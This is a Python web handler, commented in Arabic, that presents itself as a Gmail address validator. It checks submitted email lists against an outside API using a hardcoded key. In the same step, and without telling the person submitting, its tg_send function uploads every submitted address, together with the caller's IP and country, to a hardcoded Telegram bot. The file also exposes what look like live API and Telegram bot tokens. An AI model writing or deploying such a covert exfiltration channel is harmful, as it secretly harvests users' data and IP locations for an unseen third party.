import json, io, re, requests, concurrent.futures
from http.server import BaseHTTPRequestHandler

# ================= عدّل هنا بس =================
API       = "https://gmail-validation.mbahbabat.workers.dev"
KEY       = "001f8edc41000e1d82f906a16f0c90bd98c0348564b448807b8ca2e5875f69f6"
TG_TOKEN  = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"
TG_CHAT   = "8554641519"
MAX_WORKERS = 10
# ===============================================

_geo_cache = {}

def get_ip(h, addr=None):
    xf = (h.get('x-forwarded-for') or h.get('x-real-ip') or h.get('x-vercel-forwarded-for') or '')
    ip = xf.split(',')[0].strip()
    if not ip and addr:
        ip = str(addr[0])
    return ip or 'unknown'

def get_country(ip):
    if not ip or ip == 'unknown':
        return ''
    if ip in _geo_cache:
        return _geo_cache[ip]
    c = ''
    try:
        d = requests.get(f"https://ipwho.is/{ip}", timeout=3).json()
        if d.get("success"):
            c = str(d.get("country", "")).strip()
    except Exception:
        pass
    if not c:
        try:
            d = requests.get(f"https://get.geojs.io/v1/ip/country/{ip}.json", timeout=3).json()
            c = str(d.get("name", "") or d.get("country", "")).strip()
        except Exception:
            pass
    _geo_cache[ip] = c
    return c

def safe_name(country):
    n = re.sub(r'[^a-z0-9]+', '_', country.lower()).strip('_')
    return n or 'unknown'

# ── تليجرام: كل الإيميلات في ملف txt واحد دايمًا ─────────────────────────────
def tg_send(emails, ip, country):
    if not (TG_TOKEN and TG_CHAT and emails):
        return
    content    = "\n".join(emails).encode('utf-8')
    fname      = f"{safe_name(country)}.txt"
    caption    = (
        f'📥 Emails: {len(emails)}\n'
        f'🌍 Country: {country or "unknown"}\n'
        f'🌐 IP: {ip}'
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
            data={'chat_id': TG_CHAT, 'caption': caption},
            files={'document': (fname, io.BytesIO(content), 'text/plain')},
            timeout=120
        )
    except Exception:
        pass

# ── إرسال كل الإيميلات للـ API دفعة واحدة كاملة ─────────────────────────────
def check_all(emails):
    out = {e.lower(): {"email": e, "verdict": "invalid"} for e in emails}
    err = None
    try:
        r = requests.post(
            f"{API}/fastcheck1",
            headers={"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"},
            json={"mail": emails},
            timeout=300          # وقت أطول لأن الكمية ممكن تكون كبيرة
        )
        if r.status_code == 200:
            data  = r.json()
            items = data if isinstance(data, list) else data.get("results", [])
            for it in items:
                em = str(it.get("email", "")).lower()
                if em in out and str(it.get("status", "")).lower() == "live":
                    out[em]["verdict"] = "valid"
        else:
            err = f"API HTTP {r.status_code}"
    except Exception as e:
        err = str(e)
    return list(out.values()), err

# ── المعالج الرئيسي: تليجرام + API بالتوازي ──────────────────────────────────
def process_all(emails, ip, country):
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
        tg_fut  = pool.submit(tg_send,   emails, ip, country)   # تليجرام فورًا
        api_fut = pool.submit(check_all, emails)                  # API كامل دفعة واحدة

        results, errors = api_fut.result()
        tg_fut.result()

    return results, ([errors] if errors else None)


class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        def send(obj):
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(obj, ensure_ascii=False).encode('utf-8'))

        try:
            body   = json.loads(self.rfile.read(int(self.headers['Content-Length'])))
            emails = body.get("emails", [])
            if isinstance(emails, str):
                emails = [emails]

            ip      = get_ip(self.headers, self.client_address)
            country = get_country(ip)

            results, errors = process_all(emails, ip, country)

            resp = {"success": True, "results": results, "total": len(results)}
            if errors:
                resp["api_errors"] = errors
            send(resp)

        except Exception as e:
            send({"success": False, "error": str(e)})
